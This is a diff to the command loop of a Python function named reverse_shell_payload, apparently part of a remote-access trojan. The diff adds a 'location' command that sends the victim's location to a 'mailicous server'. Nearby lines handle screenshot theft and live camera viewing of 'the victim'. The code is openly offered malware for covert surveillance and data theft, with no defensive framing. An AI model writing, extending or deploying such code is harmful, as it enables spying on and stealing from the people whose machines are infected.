@@ -166,6 +166,12 @@ def reverse_shell_payload():
            if cmd.lower() == "help":
                s.send(banner.encode())
                continue
+           if cmd.lower() == "location":
+               if get_location() == True:
+                   s.send(b"Location has been sent to your mailicous_server")
+               else:
+                   s.send(b"It seems there is an issue with code fix it")
+               continue
            if cmd.lower() == "screenshoot":
                if get_screenshot() == True:
                    s.send(b"The screen shot has been sent to mailicous server\n")
@@ -198,6 +204,7 @@ def reverse_shell_payload():
            if cmd.lower() == "start-camera-live":
                threading.Thread(target=watch_victim_live,daemon=True).start()
                s.send(b"You are watching the victim for your mailicous server\n")
+               continue
            if cmd.lower() == "exit":
                break
            else:
